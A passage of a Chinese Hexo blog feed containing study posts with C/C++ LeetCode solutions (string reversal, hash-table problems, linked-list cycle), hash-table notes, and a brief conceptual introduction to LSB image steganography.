class="comment">//去掉中间的多余的空格</span></span><br><span class="line">    s[slow]=<span class="string">'\0'</span>;</span><br><span class="line">    end = slow<span class="number">-1</span>;  <span class="comment">//最后一个字符下标</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//翻转字符串</span></span><br><span class="line">    reverse(s, <span class="number">0</span>, end);<span class="comment">//先整体翻转</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//局部翻转</span></span><br><span class="line">    <span class="keyword">for</span>(slow=<span class="number">0</span>, fast=<span class="number">0</span>; fast&lt;=end+<span class="number">1</span>; fast++) {</span><br><span class="line">        <span class="keyword">if</span>(s[fast] == <span class="string">' '</span> || s[fast] == <span class="string">'\0'</span>) {</span><br><span class="line">            reverse(s, slow, fast<span class="number">-1</span>);</span><br><span class="line">            slow=fast+<span class="number">1</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">    </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>反转字符串Ⅱ</title>
    <link href="/2024/02/02/%E5%8F%8D%E8%BD%AC%E5%AD%97%E7%AC%A6%E4%B8%B2%E2%85%A1/"/>
    <url>/2024/02/02/%E5%8F%8D%E8%BD%AC%E5%AD%97%E7%AC%A6%E4%B8%B2%E2%85%A1/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/reverse-string-ii/</p><p>原本的思路：用双指针法分别找到第k个元素和第2k个元素，也没想到用<code>strlen()</code>计算数组长度，耗了半天写不出来<span class="github-emoji"><span>😓</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f613.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span></p><p>正确思路：</p><ul><li>先计算数组长度</li><li>for循环遍历数组，使用<code>i+=k*2</code>可以直接跳过不需要倒序的数组元素</li><li>给左右指针(数组下标)赋值，若剩余字符小于等于k个，则<code>right=len-1</code>（即指向最后一个元素）；否则<code>right=i+k-1</code>，即指向当前下标往后k个元素</li><li>while循环将元素倒序</li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span>* <span class="title function_">reverseStr</span><span class="params">(<span class="type">char</span>* s, <span class="type">int</span> k)</span> {</span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">strlen</span>(s); <span class="comment">//不包括'\0'</span></span><br><span class="line">    <span class="type">int</span> left, right;  <span class="comment">//左右指针</span></span><br><span class="line">    <span class="type">char</span> tmp;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;len; i+=k*<span class="number">2</span>) {</span><br><span class="line">        right = i+k&gt;len ? len<span class="number">-1</span> : i+k<span class="number">-1</span>;</span><br><span class="line">        left=i;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(left&lt;right) {</span><br><span class="line">            tmp = s[left];</span><br><span class="line">            s[left] = s[right];</span><br><span class="line">            s[right] = tmp;</span><br><span class="line">            left++;</span><br><span class="line">            right--;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>LSB隐写原理</title>
    <link href="/2024/01/30/LSB%E9%9A%90%E5%86%99/"/>
    <url>/2024/01/30/LSB%E9%9A%90%E5%86%99/</url>
    
    <content type="html"><![CDATA[<p>本文参考：https://segmentfault.com/a/1190000016223897</p><p>先介绍图像相关知识</p><h2 id="通道">通道</h2><p>图像是由很多个像素点组成的，常见的通道数有：单通道、三通道和四通道</p><ul><li>单通道：灰度图</li><li>三通道：RGB，每个通道代表一个颜色（红、绿、蓝）</li><li>四通道：RGBA，Alpha通道表示透明度</li></ul><h2 id="位深度">位深度</h2><p>位深度即颜色深度，常用的颜色深度是1位、8位、24位和32位。图像的色彩越丰富，“位”就越多，例如8 位可表示 256 中颜色深度。</p><h2 id="lsb隐写">LSB隐写</h2><blockquote><p>LSB（最低有效位）全称是Least Significant Bit，是一种基于图片最低有效位修改储存信息的隐写方法。通过修改RGB颜色分量的最低位二进制（LSB），来进行信息的储存，人类的眼睛并不能感知到前后的变化。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/202401302155156.png"></p><p><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/202401302138668.png"></p>]]></content>
    
    
    <categories>
      
      <category>图像处理</category>
      
      <category>Misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Misc</tag>
      
      <tag>图像处理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>赎金信</title>
    <link href="/2024/01/30/%E8%B5%8E%E9%87%91%E4%BF%A1/"/>
    <url>/2024/01/30/%E8%B5%8E%E9%87%91%E4%BF%A1/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/ransom-note/</p><p>根据题目描述可知，一共26个字母，因此使用辅助数组（哈希表）比较方便。</p><ul><li>使用辅助数组记录<code>ransomNote</code>中每个字母出现的次数，0~25下标对应26个字母</li><li>遍历<code>magazine</code>中的字符，将字符对应的辅助数组元素减1</li><li>最后判断<code>ransomNote</code>对应的辅助数组元素是否大于0，若大于0，则表示<code>magazine</code>中的字符不够表示<code>ransomNote</code>，返回false</li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">canConstruct</span><span class="params">(<span class="type">char</span>* ransomNote, <span class="type">char</span>* magazine)</span> {</span><br><span class="line">    <span class="type">int</span> hash[<span class="number">26</span>]; <span class="comment">//辅助数组，26个下标对应26个字母</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">26</span>; i++) {</span><br><span class="line">        hash[i] = <span class="number">0</span>;</span><br><span class="line">    }  <span class="comment">//初始化为0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; magazine[i]!=<span class="string">'\0'</span>; i++) {</span><br><span class="line">        hash[magazine[i]-<span class="string">'a'</span>]--;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; ransomNote[i]!=<span class="string">'\0'</span>; i++) {</span><br><span class="line">        hash[ransomNote[i]-<span class="string">'a'</span>]++;</span><br><span class="line">        <span class="keyword">if</span>(hash[ransomNote[i]-<span class="string">'a'</span>]&gt;<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>LeetCode</tag>
      
      <tag>哈希表</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>四数相加Ⅱ</title>
    <link href="/2024/01/29/%E5%9B%9B%E6%95%B0%E7%9B%B8%E5%8A%A0%E2%85%A1/"/>
    <url>/2024/01/29/%E5%9B%9B%E6%95%B0%E7%9B%B8%E5%8A%A0%E2%85%A1/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/4sum-ii/</p><p>本题的解题思路与<a href="https://leetcode.cn/problems/two-sum/">两数之和</a>类似。不同的是本题给出了四个数组，只需将其分为两组即可，使用C++中的<code>unordered_map</code>（&lt;key,value&gt;），<code>key</code>对应<code>n1</code>和<code>n2</code>之和，<code>value</code>对应<code>n1</code>与<code>n2</code>之和出现的次数。</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> {</span></span><br><span class="line">public:</span><br><span class="line">    <span class="type">int</span> <span class="title function_">fourSumCount</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;&amp; nums1, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;&amp; nums2, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;&amp; nums3, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;&amp; nums4)</span> {</span><br><span class="line">        <span class="built_in">unordered_map</span> &lt;<span class="type">int</span>, <span class="type">int</span>&gt; <span class="built_in">map</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> n1 : nums1)</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> n2 : nums2) {</span><br><span class="line">                <span class="built_in">map</span>[n1+n2]++;</span><br><span class="line">            }  <span class="comment">//先统计前两个数组中任意两个元素之和出现次数</span></span><br><span class="line">        <span class="type">int</span> count=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> n3 : nums3)</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> n4 : nums4) {</span><br><span class="line">                <span class="keyword">if</span>(<span class="built_in">map</span>.find(<span class="number">0</span>-(n3+n4)) != <span class="built_in">map</span>.end())</span><br><span class="line">                    count += <span class="built_in">map</span>[<span class="number">0</span>-(n3+n4)];  <span class="comment">//若找到满足条件的key，则累加</span></span><br><span class="line">            }</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数据结构</tag>
      
      <tag>CPP</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>两数之和</title>
    <link href="/2024/01/24/%E4%B8%A4%E6%95%B0%E4%B9%8B%E5%92%8C/"/>
    <url>/2024/01/24/%E4%B8%A4%E6%95%B0%E4%B9%8B%E5%92%8C/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/two-sum/</p><p>这题用到了哈希表，相关概念参考<a href="https://www.programmercarl.com/%E5%93%88%E5%B8%8C%E8%A1%A8%E7%90%86%E8%AE%BA%E5%9F%BA%E7%A1%80.html">这篇文章</a></p><p>这题用 C++ 比较方便，需要用 map(key,value)，</p><blockquote><ul><li>数组的大小是受限制的，而且如果元素很少，而哈希值太大会造成内存空间的浪费。</li><li>set是一个集合，里面放的元素只能是一个key，而两数之和这道题目，不仅要判断y是否存在而且还要记录y的下标位置，因为要返回x和 y的下标。所以set 也不能用。</li></ul></blockquote><p>步骤：</p><ul><li>遍历 nums，寻找<code>target-nums[i]</code>；</li><li>若找不到，则将 nums[i] 添加到map中；</li><li>否则返回<code>target-nums[i]</code>元素(key)对应的下标(value)；</li></ul><blockquote><p>C++ ：</p><ul><li><p><code>auto</code>是一个关键字，用于自动推断变量的数据类型。它可以让编译器根据变量的初始化表达式来推断其类型，从而减少代码中的类型声明部分，使代码更加简洁和易读。</p></li><li><p>关联容器（如<code>std::map</code>）的<code>end()</code>函数返回一个迭代器，指向容器中最后一个元素<strong>之后</strong>的位置。它并不指向任何有效的元素，本质上是一个“越过末尾”的迭代器。</p></li></ul></blockquote><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> {</span></span><br><span class="line">public:</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt; <span class="title function_">twoSum</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> target)</span> {</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">unordered_map</span> &lt;<span class="type">int</span>,<span class="type">int</span>&gt; <span class="built_in">map</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; nums.size(); i++) {</span><br><span class="line">            <span class="comment">// 遍历当前元素，并在map中寻找是否有匹配的key</span></span><br><span class="line">            <span class="keyword">auto</span> iter = <span class="built_in">map</span>.find(target - nums[i]); </span><br><span class="line">            <span class="keyword">if</span>(iter != <span class="built_in">map</span>.end()) {</span><br><span class="line">                <span class="keyword">return</span> {iter-&gt;second, i};</span><br><span class="line">            }</span><br><span class="line">            <span class="comment">// 如果没找到匹配对，就把访问过的元素和下标加入到map中</span></span><br><span class="line">            <span class="built_in">map</span>.insert(<span class="built_in">pair</span>&lt;<span class="type">int</span>, <span class="type">int</span>&gt;(nums[i], i)); </span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> {};</span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数据结构</tag>
      
      <tag>CPP</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>快乐数</title>
    <link href="/2024/01/23/%E5%BF%AB%E4%B9%90%E6%95%B0/"/>
    <url>/2024/01/23/%E5%BF%AB%E4%B9%90%E6%95%B0/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/happy-number/</p><p>根据题目描述可知，返回<code>false</code>的条件是该正整数不是快乐数即陷入死循环，但是死循环又无法通过程序返回，因此每一个正整数<code>n</code>都需要一个哈希表，记录每一步的<code>sum</code>，然后判断哈希表中是否重复出现过该值，若出现过则会陷入死循环，则立即返回<code>false</code>；否则若<code>sum==1</code>，则返回<code>true</code>。</p><blockquote><p>n 的取值范围是 1~2<sup>31</sup>-1 ，转换为十进制可知 n 有 10位数，哈希表(这题是数组)的大小范围为就是 sum 的范围，如下：</p><p>1 &lt;= sum &lt;= 1 + 81 * 9 = 730</p><p>所以数组定义为 a[731]（下标为0~730）</p></blockquote><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">isHappy</span><span class="params">(<span class="type">int</span> n)</span> {</span><br><span class="line">    <span class="type">int</span> a[<span class="number">731</span>]={<span class="number">0</span>};   <span class="comment">//辅助数组</span></span><br><span class="line">    <span class="type">int</span> sum=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>) {        <span class="comment">//无限循环</span></span><br><span class="line">        <span class="keyword">while</span>(n) {</span><br><span class="line">            sum += (n%<span class="number">10</span>)*(n%<span class="number">10</span>);</span><br><span class="line">            n /= <span class="number">10</span>;</span><br><span class="line">        }   <span class="comment">//计算每一位的平方和</span></span><br><span class="line">        <span class="keyword">if</span>(sum==<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;   <span class="comment">//若sum==1，则返回true</span></span><br><span class="line">        <span class="keyword">if</span>(a[sum]!=<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;  <span class="comment">//若a[sum]重复出现，则返回false</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            a[sum]++;</span><br><span class="line">        </span><br><span class="line">        n=sum;    <span class="comment">//更新n的值</span></span><br><span class="line">        sum=<span class="number">0</span>;    <span class="comment">//清零，进入下一次循环</span></span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>两个数组的交集</title>
    <link href="/2024/01/21/%E4%B8%A4%E4%B8%AA%E6%95%B0%E7%BB%84%E7%9A%84%E4%BA%A4%E9%9B%86/"/>
    <url>/2024/01/21/%E4%B8%A4%E4%B8%AA%E6%95%B0%E7%BB%84%E7%9A%84%E4%BA%A4%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/intersection-of-two-arrays/</p><p>这题利用哈希表的思想，用C语言需要注意一些细节：</p><ul><li>定义返回的结果数组需要使用 malloc</li><li>结果数组中没有重复的元素</li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Note: The returned array must be malloced, assume caller calls free().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span>* <span class="title function_">intersection</span><span class="params">(<span class="type">int</span>* nums1, <span class="type">int</span> nums1Size, <span class="type">int</span>* nums2, <span class="type">int</span> nums2Size, <span class="type">int</span>* returnSize)</span> {</span><br><span class="line">    <span class="type">int</span> a[<span class="number">1000</span>];  <span class="comment">//辅助数组</span></span><br><span class="line">    <span class="type">int</span> num =  (nums1Size &lt; nums2Size) ? nums1Size : nums2Size;</span><br><span class="line">    *returnSize = num;</span><br><span class="line">    <span class="type">int</span> *res = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)*num);  <span class="comment">//为结果数组开辟空间（元素个数最多为num）</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">1000</span>; i++) {</span><br><span class="line">        a[i] = <span class="number">0</span>;  <span class="comment">//初始化辅助数组</span></span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;nums1Size; i++) {</span><br><span class="line">        a[nums1[i]]++;   <span class="comment">//辅助数组对应下标的元素+1</span></span><br><span class="line">    }</span><br><span class="line">    <span class="type">int</span> count=<span class="number">0</span>;  <span class="comment">//记录数组大小</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;nums2Size; i++) {</span><br><span class="line">        <span class="keyword">if</span>(a[nums2[i]] &gt; <span class="number">0</span>) {  <span class="comment">//若 nums2 与 nums1 有相同数组，则为结果数组元素赋值</span></span><br><span class="line">            res[count++] = nums2[i];</span><br><span class="line">            </span><br><span class="line">            <span class="comment">/* Clear this count to avoid duplicated value */</span></span><br><span class="line">            a[nums2[i]] = <span class="number">0</span>;  <span class="comment">//避免存入重复的值</span></span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    *returnSize = count;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>哈希表</title>
    <link href="/2024/01/21/%E5%93%88%E5%B8%8C%E8%A1%A8/"/>
    <url>/2024/01/21/%E5%93%88%E5%B8%8C%E8%A1%A8/</url>
    
    <content type="html"><![CDATA[<ul><li><p>散列函数：将关键字<strong>映射成该关键字对应的地址</strong>的函数（直接映射关系）</p></li><li><p>散列函数构造方法：</p><ol type="1"><li><strong>直接定址法</strong>：线性函数 --<code>H(key) = a × key + b</code></li><li><strong>除留余数法</strong>：最简单最常用--<code>H(key) = key % p</code>（p为最接近/等于散列表长度的<strong>质数</strong>）</li><li><strong>数字分析法</strong>：选取数码分布较为均匀的若干位作为散列地址（例如手机号后四位）</li><li><strong>平方取中法</strong>：取关键字的平方值的中间几位数字作为散列地址</li></ol></li><li><p>处理冲突的方法：</p><ol type="1"><li><p><strong>拉链法</strong>（链接法）</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/202308222004550.png" alt="image-20230822200426453"><figcaption aria-hidden="true">image-20230822200426453</figcaption></figure></li><li><p><strong>开放定址法</strong></p><p>H<sub>i</sub> = ( H(key) + d<sub>i</sub> ) % m</p><p><strong>不能随便物理删除表中元素，若要删除元素，可使用删除标记进行逻辑删除</strong>（2023真题）</p><ul><li><strong>线性探测法</strong>：发生冲突时，顺序查看表中的<strong>下一个</strong>位置，缺点--大量元素堆积，降低了查找效率</li><li>平方探测法：又称二次探测法，散列表长度必须为可以表示为（4j+3）的质数，正负平方交替</li><li>伪随机序列法：d<sub>i</sub> 是伪随机数序列</li><li>双散列法：使用两个散列函数</li></ul></li></ol></li><li><p>装填因子 = 表中记录数/散列表长度</p></li><li><p>平均查找长度：</p><p><strong>ASL<sub>成功</sub></strong> = 查找次数/关键字个数</p><p><strong>ASL<sub>失败</sub></strong> = 查找失败次数/p（查找失败次数是从哈希函数<strong>计算出的位置</strong>[等概率]到<strong>第一个空地址</strong>(包括)；一共需要计算<strong>p个位置</strong>的查找失败次数，p为哈希函数所能计算出的地址个数，比如key%7 的范围是 0~6，所以p为7，不要多算）</p><p>例：https://www.cnblogs.com/47Gamer/p/13160610.html</p></li><li><p><strong>堆积</strong>对存储效率、散列函数和装填因子不会有影响，会影响到平均查找长度</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>数据结构</category>
      
      <category>哈希表</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数据结构</tag>
      
      <tag>哈希表</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>有效的字母异位词</title>
    <link href="/2024/01/21/%E6%9C%89%E6%95%88%E7%9A%84%E5%AD%97%E6%AF%8D%E5%BC%82%E4%BD%8D%E8%AF%8D/"/>
    <url>/2024/01/21/%E6%9C%89%E6%95%88%E7%9A%84%E5%AD%97%E6%AF%8D%E5%BC%82%E4%BD%8D%E8%AF%8D/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/valid-anagram/</p><p>这题可以直接用二重循环逐个比较两个字符串中的字符，时间复杂度为O(n<sup>2</sup>)，不太好；而使用哈希表的话，时间复杂度为O(n)，空间复杂度为 O(1)（辅助数组大小为常量26）</p><p>思路：</p><ul><li>定义一个大小为26的辅助数组，并初始化所有元素为0</li><li>'a'~'z' 分别对应辅助数组下标 0~26</li><li>遍历 s字符串，统计每个字符出现次数，即将辅助数组对应下标的元素+1</li><li>遍历 t 字符串，将每个字符对应的辅助数组下标的元素-1</li></ul><blockquote><p><code>s[i]-'a'</code>表示的就是<code>s[i]</code>字符对应的辅助数组下标</p></blockquote><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">isAnagram</span><span class="params">(<span class="type">char</span>* s, <span class="type">char</span>* t)</span> {</span><br><span class="line">    <span class="type">int</span> a[<span class="number">26</span>];  <span class="comment">//辅助数组</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">26</span>; i++) {</span><br><span class="line">        a[i] = <span class="number">0</span>;   <span class="comment">//初始化为0</span></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; s[i]!=<span class="string">'\0'</span>; i++) {</span><br><span class="line">        a[s[i]-<span class="string">'a'</span>]++;   <span class="comment">//对应的数组元素+1</span></span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; t[i]!=<span class="string">'\0'</span>; i++) {</span><br><span class="line">        a[t[i]-<span class="string">'a'</span>]--;   <span class="comment">//对应的数组元素-1</span></span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">26</span>; i++) {</span><br><span class="line">        <span class="keyword">if</span>(a[i]!=<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;   <span class="comment">//若辅助数组不全为0，则返回false</span></span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>环形链表Ⅱ</title>
    <link href="/2024/01/20/%E7%8E%AF%E5%BD%A2%E9%93%BE%E8%A1%A8%E2%85%A1/"/>
    <url>/2024/01/20/%E7%8E%AF%E5%BD%A2%E9%93%BE%E8%A1%A8%E2%85%A1/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/linked-list-cycle-ii/</p><p>这题使用<strong>快慢指针法</strong>，慢指针每次移动一个节点，快指针每次移动两个节点。</p><p>分两步解题：</p><ol type="1"><li><p>判断是否有环</p><ul><li>若有环，则快慢指针一定相遇，因为快慢指针的相对速度为1，所以快慢指针一定相遇</li></ul></li><li><p>找到环的入口</p><p><img src="https://code-thinking-1253855093.file.myqcloud.com/pics/20220925103433.png"></p><p>慢指针走过的节点数为: <code>x + y</code>，快指针走过的节点数：<code>x + y + n (y + z)</code>，因为快指针是一步走两个节点，慢指针一步走一个节点，所以快指针走过的节点数=慢指针走过的节点数* 2：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(x + y) * 2 = x + y + n (y + z)</span><br></pre></td></tr></tbody></table></figure><p>将 x 移到一边，得到<code>x = n (y + z) - y</code>，下面讨论 n的值：</p><ul><li><p>n = 1 时，<code>x = z</code></p><p>（1）移动快慢指针，找到相遇点</p><p>（2）定义两个指针，一个指向头节点，另一个指向相遇点；两个指针每次同时移动一个节点直到相遇，该相遇点则为环形入口点</p></li><li><p>n &gt; 1 时，<code>x = (n-1) (y + z) + 